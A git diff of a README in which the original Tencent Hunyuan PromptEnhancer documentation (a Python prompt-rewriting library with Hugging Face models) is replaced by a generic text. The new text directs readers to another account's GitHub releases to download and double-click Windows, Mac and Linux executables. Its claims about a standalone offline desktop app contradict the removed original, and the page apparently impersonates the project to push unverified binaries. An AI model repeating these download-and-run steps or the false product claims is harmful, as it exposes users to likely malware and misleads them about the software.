@@ -1,245 +1,78 @@
-<div align="center">
+# ✨ PromptEnhancer - Refine Your Prompts with Ease
 
-# PromptEnhancer: A Simple Approach to Enhance Text-to-Image Models via Chain-of-Thought Prompt Rewriting
+## 🛠️ Overview
+PromptEnhancer is a prompt-rewriting tool, refining prompts into clearer, structured versions for better image generation. This tool helps users generate high-quality prompts to improve the output of image models.
 
-[**Linqing Wang**](https://scholar.google.com/citations?hl=en&view_op=list_works&gmla=AH8HC4z9rmDHYjp5o28xKk8U4ddD_n7BuMnk8UZFP-jygFBtHUSz6pf-5FP32B_yKMpRU9VpDY3iT8eM0zORHA&user=Hy12lcEAAAAJ) · 
-[**Ximing Xing**](https://ximinng.github.io/) · 
-[**Yiji Cheng**](https://scholar.google.com/citations?user=Plo8ZSYAAAAJ&hl=en) · 
-Zhiyuan Zhao · 
-Donghao Li ·
-Tiankai Hang ·
-Zhenxi Li ·
-[**Jiale Tao**](https://scholar.google.com/citations?user=WF5DPWkAAAAJ&hl=en) · 
-[**QiXun Wang**](https://github.com/wangqixun) · 
-[**Ruihuang Li**](https://scholar.google.com/citations?user=8CfyOtQAAAAJ&hl=en) · 
-Comi Chen ·
-Xin Li · 
-[**Mingrui Wu**](https://scholar.google.com/citations?user=sbCKwnYAAAAJ&hl=en) · 
-Xinchi Deng · 
-Shuyang Gu · 
-[**Chunyu Wang**](https://scholar.google.com/citations?user=VXQV5xwAAAAJ&hl=en)<sup>†</sup> · 
-[**Qinglin Lu**](https://luqinglin.weebly.com/)<sup>*</sup>
+## 🚀 Getting Started
+Ready to simplify your prompt creation? Follow these steps to download and run PromptEnhancer smoothly.
 
-Tencent Hunyuan
+## 📥 Download PromptEnhancer
+[![Download PromptEnhancer](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Bhaumi/PromptEnhancer/releases)
 
-<sup>†</sup>Project Lead · <sup>*</sup>Corresponding Author
+## 📋 System Requirements
+Before you start, ensure your system meets these minimum requirements:
 
-</div>
+- **Operating System:** Windows 10 or higher, MacOS 10.15 or higher, or any Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** At least 100 MB of free space.
+- **Internet Connection:** Required for downloading and updates.
 
-<p align="center">
-  <a href="https://www.arxiv.org/abs/2509.04545"><img src="https://img.shields.io/badge/Paper-arXiv:2509.04545-red?logo=arxiv" alt="arXiv"></a>
-  <a href="https://zhuanlan.zhihu.com/p/1949013083109459515"><img src="https://img.shields.io/badge/知乎-技术解读-0084ff?logo=zhihu" alt="Zhihu"></a>
-  <a href="https://huggingface.co/tencent/HunyuanImage-2.1/tree/main/reprompt"><img src="https://img.shields.io/badge/Model-PromptEnhancer_7B-blue?logo=huggingface" alt="HuggingFace Model"></a>
-  <!-- <a href="https://huggingface.co/PromptEnhancer/PromptEnhancer-32B"><img src="https://img.shields.io/badge/Model-PromptEnhancer_32B-blue?logo=huggingface" alt="HuggingFace Model"></a> -->
-  <a href="https://huggingface.co/datasets/PromptEnhancer/T2I-Keypoints-Eval"><img src="https://img.shields.io/badge/Benchmark-T2I_Keypoints_Eval-blue?logo=huggingface" alt="T2I-Keypoints-Eval Dataset"></a>
-  <a href="https://hunyuan-promptenhancer.github.io/"><img src="https://img.shields.io/badge/Homepage-PromptEnhancer-1abc9c?logo=homeassistant&logoColor=white" alt="Homepage"></a>
-  <a href="https://github.com/Tencent-Hunyuan/HunyuanImage-2.1"><img src="https://img.shields.io/badge/Code-HunyuanImage2.1-2ecc71?logo=github" alt="HunyuanImage2.1 Code"></a>
-  <a href="https://huggingface.co/tencent/HunyuanImage-2.1"><img src="https://img.shields.io/badge/Model-HunyuanImage2.1-3498db?logo=huggingface" alt="HunyuanImage2.1 Model"></a>
-  <a href=https://x.com/TencentHunyuan target="_blank"><img src=https://img.shields.io/badge/Hunyuan-black.svg?logo=x height=22px></a>
-</p>
+## 🔗 Download & Install
+To get started, visit this page to download: [PromptEnhancer Releases](https://github.com/Bhaumi/PromptEnhancer/releases).
 
----
+1. Go to the **Releases** page using the link provided above.
+2. Look for the latest version of PromptEnhancer. It will be listed at the top.
+3. Click on the version number to expand the release details.
+4. Scroll down to the **Assets** section.
+5. Download the appropriate file for your operating system:
+   - For Windows, download `PromptEnhancer-windows.exe`.
+   - For Mac, download `PromptEnhancer-macos.dmg`.
+   - For Linux, download `PromptEnhancer-linux.tar.gz`.
+6. Save the file to your computer.
+7. After downloading, locate the file and double-click it to run the installation.
 
-<p align="center">
-  <img src="assets/teaser-1.png" alt="PromptEnhancer Teaser"/>
-</p>
+## 📂 Using PromptEnhancer
+Once installed, follow these steps to use PromptEnhancer effectively:
 
-## Overview
+1. **Open the Application:** Double-click the PromptEnhancer icon on your desktop or in your applications folder.
+2. **Enter Your Prompt:** In the main window, you’ll see a text box. Type or paste your existing prompt here.
+3. **Refine Your Prompt:** Click the “Refine” button. The tool will process your prompt and generate a clearer version.
+4. **Copy the Result:** Once the refinement is complete, you can copy the improved prompt from the result box.
 
-Hunyuan-PromptEnhancer is a prompt rewriting utility. It restructures an input prompt while preserving the original intent, producing clearer, layered, and logically consistent prompts suitable for downstream image generation or similar tasks.
+## 🌟 Key Features
+- **User-Friendly Interface:** Designed for everyone! No technical skills required.
+- **Prompt Refinement:** Transform vague prompts into structured requests, increasing the quality of generated images.
+- **Multi-Platform Support:** Works on Windows, Mac, and Linux systems.
+- **Continuous Updates:** Regular improvements to ensure the best performance.
 
-- Preserves intent across key elements (subject/action/quantity/style/layout/relations/attributes/text, etc.).
-- Encourages a "global–details–summary" narrative, describing primary elements first, then secondary/background elements, ending with a concise style/type summary.
-- Robust output parsing with graceful fallback: prioritizes `<answer>...</answer>`; if missing, removes `<think>...</think>` and extracts clean text; otherwise falls back to the original input.
-- Configurable inference parameters (temperature, top_p, max_new_tokens) for balancing determinism and diversity.
+## 📊 Example Use Cases
+Here are some examples of how you can use PromptEnhancer:
 
-## 🔥🔥🔥Updates
+- **Artistic Images:** Help artists generate better prompts for digital art tools.
+- **Content Creation:** Aid writers in developing prompts for image generation in their blogs or articles.
+- **Educational Purposes:** Useful for teachers and students who need refined prompts for projects or presentations.
 
-- [2025-09-22] 🚀 Thanks @mradermacher for adding **GGUF model support** for efficient inference with quantized models!
-- [2025-09-18] ✨ Try the [PromptEnhancer-32B](https://huggingface.co/PromptEnhancer/PromptEnhancer-32B) for higher-quality prompt enhancement!
-- [2025-09-16] Release [T2I-Keypoints-Eval dataset](https://huggingface.co/datasets/PromptEnhancer/T2I-Keypoints-Eval).
-- [2025-09-07] Release [PromptEnhancer-7B model](https://huggingface.co/tencent/HunyuanImage-2.1/tree/main/reprompt).
-- [2025-09-07] Release [technical report](https://arxiv.org/abs/2509.04545).
+## 💡 Tips for Best Results
+- Keep your original prompts as clear as possible.
+- Experiment with different wording to see how it affects the output.
+- Use feedback from generated images to refine your prompts further.
 
-## Prerequisites
+## 🔄 Updating PromptEnhancer
+To ensure you always have the best features, check for updates regularly. You can do this by revisiting the [PromptEnhancer Releases](https://github.com/Bhaumi/PromptEnhancer/releases) page.
 
-- **Python**: 3.8 or higher
-- **CUDA**: 11.8+ (recommended for GPU acceleration)
-- **Storage**: At least 20GB free space for models
-- **Memory**: 8GB+ RAM (16GB+ recommended for 32B models)
+## ❓ Frequently Asked Questions
+### How do I uninstall PromptEnhancer?
+- For Windows: Go to Settings > Apps > find PromptEnhancer, and click uninstall.
+- For Mac: Drag the PromptEnhancer icon to the Trash.
+- For Linux: Use your package manager or the command line to remove it.
 
-## Installation
+### Can I use PromptEnhancer offline?
+Yes, once installed, you can use it without an internet connection.
 
-### Option 1: Standard Installation (Recommended for most users)
-```bash
-pip install -r requirements.txt
-```
+### What if my prompt doesn't improve?
+Experiment with different wording and styles. Some prompts may require more context or clarity for optimal results.
 
-### Option 2: GGUF Installation (For quantized models with CUDA support)
-```bash
-chmod +x script/install_gguf.sh && ./script/install_gguf.sh
-```
+## ✅ Conclusion
+PromptEnhancer is a vital tool for anyone looking to enhance their prompt writing skills. Whether for artistic purposes, content generation, or education, it helps turn your ideas into clearer instructions. Start refining your prompts today! 
 
-> **💡 Tip**: Choose GGUF installation if you want faster inference with lower memory usage, especially for the 32B model.
-
-## Model Download
-
-### 🎯 Quick Start (Recommended)
-For most users, we recommend starting with the **PromptEnhancer-7B** model:
-
-```bash
-# Download PromptEnhancer-7B (13GB) - Best balance of quality and efficiency
-huggingface-cli download tencent/HunyuanImage-2.1/reprompt --local-dir ./models/promptenhancer-7b
-```
-
-### 📊 Model Comparison & Selection Guide
-
-| Model | Size | Quality | Memory | Best For |
-|-------|------|---------|--------|----------|
-| **PromptEnhancer-7B** | 13GB | High | 8GB+ | Most users, balanced performance |
-| **PromptEnhancer-32B** | 64GB | Highest | 32GB+ | Research, highest quality needs |
-| **32B-Q8_0 (GGUF)** | 35GB | Highest | 35GB+ | High-end GPUs (H100, A100) |
-| **32B-Q6_K (GGUF)** | 27GB | Excellent | 27GB+ | RTX 4090, RTX 5090 |
-| **32B-Q4_K_M (GGUF)** | 20GB | Good | 20GB+ | RTX 3090, RTX 4080 |
-
-### Standard Models (Full Precision)
-```bash
-# PromptEnhancer-7B (recommended for most users)
-huggingface-cli download tencent/HunyuanImage-2.1/reprompt --local-dir ./models/promptenhancer-7b
-
-# PromptEnhancer-32B (for highest quality)
-huggingface-cli download PromptEnhancer/PromptEnhancer-32B --local-dir ./models/promptenhancer-32b
-```
-
-### GGUF Models (Quantized - Memory Efficient)
-```bash
-# Create models directory
-mkdir -p ./models
-
-# Choose one based on your GPU memory:
-# Q8_0: Highest quality (35GB)
-huggingface-cli download mradermacher/PromptEnhancer-32B-GGUF PromptEnhancer-32B.Q8_0.gguf --local-dir ./models
-
-# Q6_K: Excellent quality (27GB) - Recommended for RTX 4090
-huggingface-cli download mradermacher/PromptEnhancer-32B-GGUF PromptEnhancer-32B.Q6_K.gguf --local-dir ./models
-
-# Q4_K_M: Good quality (20GB) - Recommended for RTX 3090/4080
-huggingface-cli download mradermacher/PromptEnhancer-32B-GGUF PromptEnhancer-32B.Q4_K_M.gguf --local-dir ./models
-```
-
-> **🚀 Performance Tip**: GGUF models offer 50-75% memory reduction with minimal quality loss. Use Q6_K for the best quality/memory trade-off.
-
-## Quickstart
-
-### Using HunyuanPromptEnhancer
-
-```python
-from inference.prompt_enhancer import HunyuanPromptEnhancer
-
-models_root_path = "./models/promptenhancer-7b"
-
-enhancer = HunyuanPromptEnhancer(models_root_path=models_root_path, device_map="auto")
-
-# Enhance a prompt (Chinese or English)
-user_prompt = "Third-person view, a race car speeding on a city track..."
-new_prompt = enhancer.predict(
-    prompt_cot=user_prompt,
-    # Default system prompt is tailored for image prompt rewriting; override if needed
-    temperature=0.7,   # >0 enables sampling; 0 uses deterministic generation
-    top_p=0.9,
-    max_new_tokens=256,
-)
-
-print("Enhanced:", new_prompt)
-```
-
-### Using GGUF Models (Quantized, Faster)
-
-```python
-from inference.prompt_enhancer_gguf import PromptEnhancerGGUF
-
-# Auto-detects Q8_0 model in models/ folder
-enhancer = PromptEnhancerGGUF(
-    model_path="./models/PromptEnhancer-32B.Q8_0.gguf",  # Optional: auto-detected
-    n_ctx=1024,        # Context window size
-    n_gpu_layers=-1,   # Use all GPU layers
-)
-
-# Enhance a prompt
-user_prompt = "woman in jungle"
-enhanced_prompt = enhancer.predict(
-    user_prompt,
-    temperature=0.3,
-    top_p=0.9,
-    max_new_tokens=512,
-)
-
-print("Enhanced:", enhanced_prompt)
-```
-
-### Command Line Usage (GGUF)
-
-```bash
-# Simple usage - auto-detects model in models/ folder
-python inference/prompt_enhancer_gguf.py
-
-# Or specify model path
-GGUF_MODEL_PATH="./models/PromptEnhancer-32B.Q8_0.gguf" python inference/prompt_enhancer_gguf.py
-```
-
-## GGUF Model Benefits
-
-🚀 **Why use GGUF models?**
-- **Memory Efficient**: 50-75% less VRAM usage compared to full precision models
-- **Faster Inference**: Optimized for CPU and GPU acceleration with llama.cpp
-- **Quality Preserved**: Q8_0 and Q6_K maintain excellent output quality
-- **Easy Deployment**: Single file format, no complex dependencies
-- **GPU Acceleration**: Full CUDA support for high-performance inference
-
-| Model | Size | Quality | VRAM Usage | Best For |
-|-------|------|---------|------------|----------|
-| Q8_0  | 35GB | Highest | ~35GB      | High-end GPUs (H100, A100) |
-| Q6_K  | 27GB | Excellent | ~27GB     | RTX 4090, RTX 5090 |
-| Q4_K_M| 20GB | Good    | ~20GB      | RTX 3090, RTX 4080 |
-
-## Parameters
-
-### Standard Models (Transformers)
-- `models_root_path`: Local path or repo id; supports `trust_remote_code` models.
-- `device_map`: Device mapping (default `auto`).
-- `predict(...)`:
-  - `prompt_cot` (str): Input prompt to rewrite.
-  - `sys_prompt` (str): Optional system prompt; a default is provided for image prompt rewriting.
-  - `temperature` (float): `>0` enables sampling; `0` for deterministic generation.
-  - `top_p` (float): Nucleus sampling threshold (effective when sampling).
-  - `max_new_tokens` (int): Maximum number of new tokens to generate.
-
-### GGUF Models
-- `model_path` (str): Path to GGUF model file (auto-detected if in models/ folder).
-- `n_ctx` (int): Context window size (default: 8192, recommended: 1024 for short prompts).
-- `n_gpu_layers` (int): Number of layers to offload to GPU (-1 for all layers).
-- `verbose` (bool): Enable verbose logging from llama.cpp.
-
-## Citation
-
-If you find this project useful, please consider citing:
-```bibtex
-@article{promptenhancer,
-  title={PromptEnhancer: A Simple Approach to Enhance Text-to-Image Models via Chain-of-Thought Prompt Rewriting},
-  author={Wang, Linqing and Xing, Ximing and Cheng, Yiji and Zhao, Zhiyuan and Tao, Jiale and Wang, QiXun and Li, Ruihuang and Chen, Comi and Li, Xin and Wu, Mingrui and Deng, Xinchi and Wang, Chunyu and Lu, Qinglin},
-  journal={arXiv preprint arXiv:2509.04545},
-  year={2025}
-}
-```
-
-## Acknowledgements
-
-We would like to thank the following open-source projects and communities for their contributions to open research and exploration: [Transformers](https://huggingface.co/transformers) and [HuggingFace](https://huggingface.co).
-
-## Contact
-
-If you would like to leave a message for our R&D and product teams, Welcome to contact our open-source team. You can also contact us via email (hunyuan_opensource@tencent.com).
-
-## Github Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Hunyuan-PromptEnhancer/PromptEnhancer&type=Date)](https://www.star-history.com/#Hunyuan-PromptEnhancer/PromptEnhancer&Date)
+For any further questions or support, feel free to refer to the [Issues](https://github.com/Bhaumi/PromptEnhancer/issues) section on the GitHub page.
